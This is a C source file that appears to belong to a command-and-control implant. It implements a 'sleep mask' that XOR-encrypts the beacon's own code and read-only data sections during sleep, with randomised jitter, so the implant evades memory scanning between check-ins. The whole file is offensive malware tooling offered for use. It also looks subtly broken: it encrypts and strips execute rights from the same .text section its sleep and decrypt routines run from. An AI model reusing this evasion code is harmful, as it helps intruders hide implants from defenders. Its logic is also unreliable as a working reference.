#include "WaitMask.h"
#include "ntdll.h"
#include <intrin.h>

// Global sleep mask configuration
SLEEP_MASK_CONFIG g_SleepMaskConfig = { 0 };

// Generate random XOR key
BYTE GenerateXorKey() {
    ULONG seed = ApiWin->GetTickCount();
    seed = ApiNt->RtlRandomEx(&seed);
    return (BYTE)(seed & 0xFF);
}

// Safe virtual protect
BOOL SafeVirtualProtect(PVOID pAddress, SIZE_T size, DWORD newProtect, PDWORD pOldProtect) {
    if (!pAddress || size == 0 || !pOldProtect) return FALSE;

    if (ApiWin && ApiWin->VirtualAlloc) {
        typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
        VirtualProtect_t pVirtualProtect = (VirtualProtect_t)GetProcAddress(
            SysModules->Kernel32, "VirtualProtect");

        if (pVirtualProtect) {
            return pVirtualProtect(pAddress, size, newProtect, pOldProtect);
        }
    }

    return FALSE;
}

// Get section information from PE
BOOL GetSectionInfo(HMODULE hModule, LPCSTR sectionName, PVOID* pBase, SIZE_T* pSize) {
    if (!hModule || !sectionName || !pBase || !pSize) return FALSE;

    *pBase = NULL;
    *pSize = 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        char name[9] = { 0 };
        memcpy(name, pSection[i].Name, 8);

        if (StrCmpLowA((CHAR*)name, (CHAR*)sectionName) == 0) {
            *pBase = (BYTE*)hModule + pSection[i].VirtualAddress;
            *pSize = pSection[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}

// Initialize sleep mask
BOOL InitSleepMask(PVOID pBeaconBase, SIZE_T beaconSize) {
    if (!pBeaconBase || beaconSize == 0) return FALSE;

    memset(&g_SleepMaskConfig, 0, sizeof(SLEEP_MASK_CONFIG));

    g_SleepMaskConfig.pBeaconBase = pBeaconBase;
    g_SleepMaskConfig.beaconSize = beaconSize;
    g_SleepMaskConfig.xorKey = GenerateXorKey();

    // Get section info
    HMODULE hModule = (HMODULE)pBeaconBase;

    GetSectionInfo(hModule, ".text", &g_SleepMaskConfig.pTextSection, &g_SleepMaskConfig.textSectionSize);
    GetSectionInfo(hModule, ".rdata", &g_SleepMaskConfig.pRdataSection, &g_SleepMaskConfig.rdataSectionSize);
    GetSectionInfo(hModule, ".data", &g_SleepMaskConfig.pDataSection, &g_SleepMaskConfig.dataSectionSize);

    // Default: encrypt all sections
    g_SleepMaskConfig.bEncryptText = TRUE;
    g_SleepMaskConfig.bEncryptRdata = TRUE;
    g_SleepMaskConfig.bEncryptData = FALSE; // Don't encrypt .data by default (contains globals)

    return TRUE;
}

// Encrypt memory region
BOOL EncryptMemoryRegion(PVOID pAddress, SIZE_T size, BYTE key) {
    if (!pAddress || size == 0) return FALSE;

    // XOR encryption is symmetric, so encrypt and decrypt are the same
    BYTE* pBytes = (BYTE*)pAddress;

    // Use volatile to prevent compiler optimization
    for (SIZE_T i = 0; i < size; i++) {
        pBytes[i] ^= key;
    }

    return TRUE;
}

// Decrypt memory region (same as encrypt for XOR)
BOOL DecryptMemoryRegion(PVOID pAddress, SIZE_T size, BYTE key) {
    return EncryptMemoryRegion(pAddress, size, key);
}

// Encrypt sections before sleep
BOOL SleepMaskEncrypt() {
    if (!g_SleepMaskConfig.pBeaconBase) return FALSE;

    BYTE key = g_SleepMaskConfig.xorKey;

    // Encrypt .text section
    if (g_SleepMaskConfig.bEncryptText && g_SleepMaskConfig.pTextSection) {
        SafeVirtualProtect(g_SleepMaskConfig.pTextSection, g_SleepMaskConfig.textSectionSize,
            PAGE_READWRITE, &g_SleepMaskConfig.previousTextProtect);

        EncryptMemoryRegion(g_SleepMaskConfig.pTextSection, g_SleepMaskConfig.textSectionSize, key);
    }

    // Encrypt .rdata section
    if (g_SleepMaskConfig.bEncryptRdata && g_SleepMaskConfig.pRdataSection) {
        SafeVirtualProtect(g_SleepMaskConfig.pRdataSection, g_SleepMaskConfig.rdataSectionSize,
            PAGE_READWRITE, &g_SleepMaskConfig.previousRdataProtect);

        EncryptMemoryRegion(g_SleepMaskConfig.pRdataSection, g_SleepMaskConfig.rdataSectionSize, key);
    }

    // Encrypt .data section (optional)
    if (g_SleepMaskConfig.bEncryptData && g_SleepMaskConfig.pDataSection) {
        SafeVirtualProtect(g_SleepMaskConfig.pDataSection, g_SleepMaskConfig.dataSectionSize,
            PAGE_READWRITE, &g_SleepMaskConfig.previousDataProtect);

        EncryptMemoryRegion(g_SleepMaskConfig.pDataSection, g_SleepMaskConfig.dataSectionSize, key);
    }

    return TRUE;
}

// Decrypt sections after sleep
BOOL SleepMaskDecrypt() {
    if (!g_SleepMaskConfig.pBeaconBase) return FALSE;

    BYTE key = g_SleepMaskConfig.xorKey;
    DWORD oldProtect = 0;

    // Decrypt .text section
    if (g_SleepMaskConfig.bEncryptText && g_SleepMaskConfig.pTextSection) {
        DecryptMemoryRegion(g_SleepMaskConfig.pTextSection, g_SleepMaskConfig.textSectionSize, key);

        SafeVirtualProtect(g_SleepMaskConfig.pTextSection, g_SleepMaskConfig.textSectionSize,
            g_SleepMaskConfig.previousTextProtect, &oldProtect);
    }

    // Decrypt .rdata section
    if (g_SleepMaskConfig.bEncryptRdata && g_SleepMaskConfig.pRdataSection) {
        DecryptMemoryRegion(g_SleepMaskConfig.pRdataSection, g_SleepMaskConfig.rdataSectionSize, key);

        SafeVirtualProtect(g_SleepMaskConfig.pRdataSection, g_SleepMaskConfig.rdataSectionSize,
            g_SleepMaskConfig.previousRdataProtect, &oldProtect);
    }

    // Decrypt .data section (optional)
    if (g_SleepMaskConfig.bEncryptData && g_SleepMaskConfig.pDataSection) {
        DecryptMemoryRegion(g_SleepMaskConfig.pDataSection, g_SleepMaskConfig.dataSectionSize, key);

        SafeVirtualProtect(g_SleepMaskConfig.pDataSection, g_SleepMaskConfig.dataSectionSize,
            g_SleepMaskConfig.previousDataProtect, &oldProtect);
    }

    // Generate new key for next sleep
    g_SleepMaskConfig.xorKey = GenerateXorKey();

    return TRUE;
}

// Masked sleep with encryption
void MaskedSleep(DWORD ms) {
    // Encrypt memory
    SleepMaskEncrypt();

    // Sleep
    ApiWin->Sleep(ms);

    // Decrypt memory
    SleepMaskDecrypt();
}

// Masked sleep with jitter
void MaskedSleepWithJitter(DWORD ms, DWORD jitter) {
    DWORD actualSleep = ms;

    if (jitter > 0 && jitter <= 100) {
        DWORD delta = (ms * jitter) / 100;
        if (delta > 0) {
            DWORD randomDelta = GenerateRandom32() % delta;
            actualSleep = ms - randomDelta + (GenerateRandom32() % (delta * 2));
        }
    }

    MaskedSleep(actualSleep);
}

// Reset sleep mask config
void ResetSleepMaskConfig() {
    memset(&g_SleepMaskConfig, 0, sizeof(SLEEP_MASK_CONFIG));
}

// Cleanup sleep mask
void CleanupSleepMask() {
    ResetSleepMaskConfig();
}

// Original WaitMask function
void WaitMask(ULONG worktime, ULONG sleepTime, ULONG jitter)
{
    ULONG maxSleepTime = 0;
    if (worktime) {
        maxSleepTime = worktime * 1000;
    }
    else if (sleepTime) {
        maxSleepTime = sleepTime * 1000;
        if (jitter) {
            ULONG deltaTime = 0;
            ULONG minTime = sleepTime * jitter / 100;
            if (minTime)
                deltaTime = GenerateRandom32() % minTime;
            if (deltaTime < maxSleepTime)
                maxSleepTime -= deltaTime;
        }
    }

    // Check if sleep masking is initialized
    if (g_SleepMaskConfig.pBeaconBase) {
        MaskedSleep(maxSleepTime);
    }
    else {
        mySleep(maxSleepTime);
    }
}

// Original WaitMaskWithEvent function
void WaitMaskWithEvent(HANDLE hEvent, ULONG worktime, ULONG sleepTime, ULONG jitter)
{
    ULONG maxSleepTime = 0;
    if (worktime) {
        maxSleepTime = worktime * 1000;
    }
    else if (sleepTime) {
        maxSleepTime = sleepTime * 1000;
        if (jitter) {
            ULONG deltaTime = 0;
            ULONG minTime = sleepTime * jitter / 100;
            if (minTime)
                deltaTime = GenerateRandom32() % minTime;
            if (deltaTime < maxSleepTime)
                maxSleepTime -= deltaTime;
        }
    }

    if (hEvent) {
        // Encrypt before waiting
        if (g_SleepMaskConfig.pBeaconBase) {
            SleepMaskEncrypt();
        }

        DWORD waitResult = ApiWin->WaitForSingleObject(hEvent, maxSleepTime);

        // Decrypt after waiting
        if (g_SleepMaskConfig.pBeaconBase) {
            SleepMaskDecrypt();
        }

        if (waitResult == WAIT_OBJECT_0)
            ApiWin->ResetEvent(hEvent);
    }
    else {
        if (g_SleepMaskConfig.pBeaconBase) {
            MaskedSleep(maxSleepTime);
        }
        else {
            ApiWin->Sleep(maxSleepTime);
        }
    }
}

// Original mySleep function
void mySleep(ULONG ms)
{
    ApiWin->Sleep(ms);
}